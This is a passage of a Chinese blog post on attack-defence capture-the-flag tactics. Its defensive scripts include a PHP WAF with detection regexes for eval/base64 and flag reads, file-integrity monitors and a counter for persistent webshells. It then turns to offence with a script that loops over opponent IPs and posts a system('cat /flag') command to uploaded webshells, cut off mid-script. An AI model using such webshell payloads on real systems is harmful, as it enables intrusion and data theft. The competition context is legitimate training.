invoke__">substr_count</span>(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\.\.|.*\.php[35]&#123;0,1&#125;/i&quot;</span>, <span class="hljs-variable">$tmp</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;LFI/LFR&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/base64_decode|eval\(|assert\(/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;EXEC&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;GETFLAG&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">简单将易出现问题的字符替换成中文</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">获取http的请求包，意义在于获取别人的攻击payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_http_raw</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$raw</span>.= <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>] . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>] . <span class="hljs-string">&quot;\r\n&quot;</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) === <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;<br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>, <span class="hljs-number">5</span>);<br>            <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$key</span>);<br>            <span class="hljs-variable">$raw</span>.= <span class="hljs-variable">$key</span> . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;\r\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$raw</span>.= <span class="hljs-string">&quot;\r\n&quot;</span>;<br>    <span class="hljs-variable">$raw</span>.= <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$raw</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这里拦截并记录攻击payload</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_attack_log</span>(<span class="hljs-params"><span class="hljs-variable">$alert</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y/m/d H:i:s&quot;</span>) . <span class="hljs-string">&quot; --</span><br><span class="hljs-string">[&quot;</span> . <span class="hljs-variable">$alert</span> . <span class="hljs-string">&quot;]&quot;</span> . <span class="hljs-string">&quot;\r\n&quot;</span> . <span class="hljs-title function_ invoke__">get_http_raw</span>() . <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br>    <span class="hljs-variable">$ffff</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;log_is_a_secret_file.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//日志路径</span><br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$ffff</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$ffff</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$alert</span> == <span class="hljs-string">&#x27;GETFLAG&#x27;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location:http://172.16.9.2/&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">15</span>); <span class="hljs-comment">//拦截前延时15秒</span><br>        <br>    &#125;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后，提醒：需要注意的是，部署waf可能会导致服务不可用，部署后要密切留意自己服务器的状态。</p><h4 id="（2）Shell监控新增文件"><a href="#（2）Shell监控新增文件" class="headerlink" title="（2）Shell监控新增文件"></a>（2）Shell监控新增文件</h4><p>创建文件的时候更改文件创建时间熟悉可能监测不到。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">do</span><br>    find /var/www/dvwa/ -cmin -60 -<span class="hljs-built_in">type</span> f | xargs <span class="hljs-built_in">rm</span> -rf<br>    <span class="hljs-built_in">sleep</span> 1<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>循环监听一小时以内更改过的文件或新增的文件，进行删除。</p><h4 id="（3）Python监测新增文件"><a href="#（3）Python监测新增文件" class="headerlink" title="（3）Python监测新增文件"></a>（3）Python监测新增文件</h4><p>放在 <code>/var/www/</code> 或 <code>/var/www/html</code> 下执行这个脚本，它会先备份当然目录下的所有文件，然后监控当前目录，一旦当前目录下的某个文件发生变更，就会自动还原，有新的文件产生就会自动删除。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#use: python file_check.py ./</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> ntpath<br><span class="hljs-keyword">import</span> time<br><br>CWD = os.getcwd()<br>FILE_MD5_DICT = &#123;&#125; <span class="hljs-comment"># 文件MD5字典</span><br>ORIGIN_FILE_LIST = []<br><br><span class="hljs-comment"># 特殊文件路径字符串</span><br>Special_path_str = <span class="hljs-string">&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br>bakstring = <span class="hljs-string">&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br>logstring = <span class="hljs-string">&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>webshellstring = <span class="hljs-string">&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>difffile = <span class="hljs-string">&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><br>Special_string = <span class="hljs-string">&#x27;drops_log&#x27;</span> <span class="hljs-comment"># 免死金牌</span><br>UNICODE_ENCODING = <span class="hljs-string">&quot;utf-8&quot;</span><br>INVALID_UNICODE_CHAR_FORMAT = <span class="hljs-string">r&quot;\?%02x&quot;</span><br><br><span class="hljs-comment"># 文件路径字典</span><br>spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))<br>Special_path = &#123;<br>    <span class="hljs-string">&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),<br>    <span class="hljs-string">&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),<br>    <span class="hljs-string">&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),<br>    <span class="hljs-string">&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isListLike</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">isinstance</span>(value, (<span class="hljs-built_in">list</span>, <span class="hljs-built_in">tuple</span>, <span class="hljs-built_in">set</span>))<br><br><span class="hljs-comment"># 获取Unicode编码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUnicode</span>(<span class="hljs-params">value, encoding=<span class="hljs-literal">None</span>, noneToNull=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> noneToNull <span class="hljs-keyword">and</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> NULL<br>    <span class="hljs-keyword">if</span> isListLike(value):<br>        value = <span class="hljs-built_in">list</span>(getUnicode(_, encoding, noneToNull) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value)<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(value, unicode):<br>        <span class="hljs-keyword">return</span> value<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> unicode(value, encoding <span class="hljs-keyword">or</span> UNICODE_ENCODING)<br>            <span class="hljs-keyword">except</span> UnicodeDecodeError, ex:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">return</span> unicode(value, UNICODE_ENCODING)<br>                <span class="hljs-keyword">except</span>:<br>                    value = value[:ex.start] + <span class="hljs-string">&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class="hljs-built_in">ord</span>(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> unicode(value)<br>        <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>            <span class="hljs-keyword">return</span> unicode(<span class="hljs-built_in">str</span>(value), errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment"># 目录创建</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mkdir_p</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">import</span> errno<br>    <span class="hljs-keyword">try</span>:<br>        os.makedirs(path)<br>    <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> exc:<br>        <span class="hljs-keyword">if</span> exc.errno == errno.EEXIST <span class="hljs-keyword">and</span> os.path.isdir(path):<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>: <span class="hljs-keyword">raise</span><br><br><span class="hljs-comment"># 获取当前所有文件路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilelist</span>(<span class="hljs-params">cwd</span>):<br>    filelist = []<br>    <span class="hljs-keyword">for</span> root,subdirs, files <span class="hljs-keyword">in</span> os.walk(cwd):<br>        <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> files:<br>            originalfile = os.path.join(root, filepath)<br>            <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> originalfile:<br>                filelist.append(originalfile)<br>    <span class="hljs-keyword">return</span> filelist<br><br><span class="hljs-comment"># 计算机文件MD5值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calcMD5</span>(<span class="hljs-params">filepath</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            md5obj = hashlib.md5()<br>            md5obj.update(f.read())<br>            <span class="hljs-built_in">hash</span> = md5obj.hexdigest()<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span><br>    <span class="hljs-keyword">except</span> Exception, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)<br>        <span class="hljs-built_in">print</span> getUnicode(e)<br>        <span class="hljs-keyword">try</span>:<br>            ORIGIN_FILE_LIST.remove(filepath)<br>            FILE_MD5_DICT.pop(filepath, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">except</span> KeyError, e:<br>            <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># 获取所有文件MD5</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getfilemd5dict</span>(<span class="hljs-params">filelist = []</span>):<br>    filemd5dict = &#123;&#125;<br>    <span class="hljs-keyword">for</span> ori_file <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ori_file:<br>            md5 = calcMD5(os.path.realpath(ori_file))<br>            <span class="hljs-keyword">if</span> md5:<br>                filemd5dict[ori_file] = md5<br>    <span class="hljs-keyword">return</span> filemd5dict<br><br><span class="hljs-comment"># 备份所有文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backup_file</span>(<span class="hljs-params">filelist=[]</span>):<br>    <span class="hljs-comment"># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br>    <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> filelist:<br>        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filepath:<br>            shutil.copy2(filepath, Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;---------start------------&#x27;</span><br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> Special_path:<br>        mkdir_p(Special_path[value])<br>    <span class="hljs-comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br>    ORIGIN_FILE_LIST = getfilelist(CWD)<br>    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)<br>    backup_file(ORIGIN_FILE_LIST) <span class="hljs-comment"># TODO 备份文件可能会产生重名BUG</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] pre work end!&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        file_list = getfilelist(CWD)<br>        <span class="hljs-comment"># 移除新上传文件</span><br>        diff_file_list = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(file_list) ^ <span class="hljs-built_in">set</span>(ORIGIN_FILE_LIST))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(diff_file_list) != <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># import pdb;pdb.set_trace()</span><br>            <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> diff_file_list:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)<br>                        shutil.move(filepath, os.path.join(Special_path[<span class="hljs-string">&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class="hljs-string">&#x27; : &#x27;</span> + <span class="hljs-built_in">str</span>(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)<br><br>        <span class="hljs-comment"># 防止任意文件被修改,还原被修改文件</span><br>        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)<br>        <span class="hljs-keyword">for</span> filekey <span class="hljs-keyword">in</span> md5_dict:<br>            <span class="hljs-keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:<br>                <span class="hljs-keyword">try</span>:<br>                    f = <span class="hljs-built_in">open</span>(filekey, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br>                <span class="hljs-keyword">except</span> Exception, e:<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:<br>                    <span class="hljs-keyword">try</span>:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)<br>                        shutil.move(filekey, os.path.join(Special_path[<span class="hljs-string">&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class="hljs-string">&#x27;.txt&#x27;</span>))<br>                        shutil.move(os.path.join(Special_path[<span class="hljs-string">&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)<br>                    <span class="hljs-keyword">try</span>:<br>                        f = <span class="hljs-built_in">open</span>(os.path.join(Special_path[<span class="hljs-string">&#x27;log&#x27;</span>], <span class="hljs-string">&#x27;log.txt&#x27;</span>), <span class="hljs-string">&#x27;a&#x27;</span>)<br>                        f.write(<span class="hljs-string">&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class="hljs-string">&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                        <span class="hljs-built_in">print</span> <span class="hljs-string">u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)<br>                        <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-comment"># print &#x27;[*] &#x27; + getUnicode(time.ctime())</span><br></code></pre></td></tr></table></figure><h4 id="（4）修改curl"><a href="#（4）修改curl" class="headerlink" title="（4）修改curl"></a>（4）修改curl</h4><p>获取flag一般都是通过执行 <code>curl http://xxx.com/flag.txt</code><br>更改其别名，使其无法获取flag内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> curl = <span class="hljs-string">&#x27;echo flag&#123;e4248e83e4ca862303053f2908a7020d&#125;&#x27;</span> 使用别名，<br><span class="hljs-built_in">chmod</span> -x curl  降权，取消执行权限<br></code></pre></td></tr></table></figure><h4 id="（5）克制不死马、内存马"><a href="#（5）克制不死马、内存马" class="headerlink" title="（5）克制不死马、内存马"></a>（5）克制不死马、内存马</h4><p>使用条件竞争的方式，不断循环创建和不死马同名的文件和文件夹，在此次比赛中使用此方式克制<br>了不死马。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>dire=<span class="hljs-string">&quot;/var/www/html/.base.php/&quot;</span><br>file=<span class="hljs-string">&quot;/var/www/html/.base.php&quot;</span><br><span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$file</span><br><span class="hljs-built_in">mkdir</span> <span class="hljs-variable">$dire</span><br>./xx.sh<br></code></pre></td></tr></table></figure><h3 id="查找后门"><a href="#查找后门" class="headerlink" title="查找后门"></a>查找后门</h3><p>对备份web目录进行后门查杀</p><p>查杀到后门文件后，查看后门路径及密码，直接通过菜刀连接。</p><h6 id="脚本获取webshell并快速提交"><a href="#脚本获取webshell并快速提交" class="headerlink" title="脚本获取webshell并快速提交"></a><strong>脚本获取webshell并快速提交</strong></h6><p>为了速度，可以通过脚本进行批量获取webshell，脚本快速提交，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><br><span class="hljs-keyword">import</span> request<br>url=<span class="hljs-string">&quot;http://192.168.71.&quot;</span><br>url1=<span class="hljs-string">&quot;&quot;</span><br>path=<span class="hljs-string">&quot;/upload/index.php&quot;</span><br>passwd=<span class="hljs-string">&quot;test&quot;</span><br>port=<span class="hljs-string">&quot;80&quot;</span><br>payload=&#123;passwd: <span class="hljs-string">&#x27;system(\&#x27;cat /flag\&#x27;);&#x27;</span>&#125;<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;webshell_list.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag_list.txt&quot;</span>. <span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>]:<br> url1=url+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;:&quot;</span>+port+path<br> <span 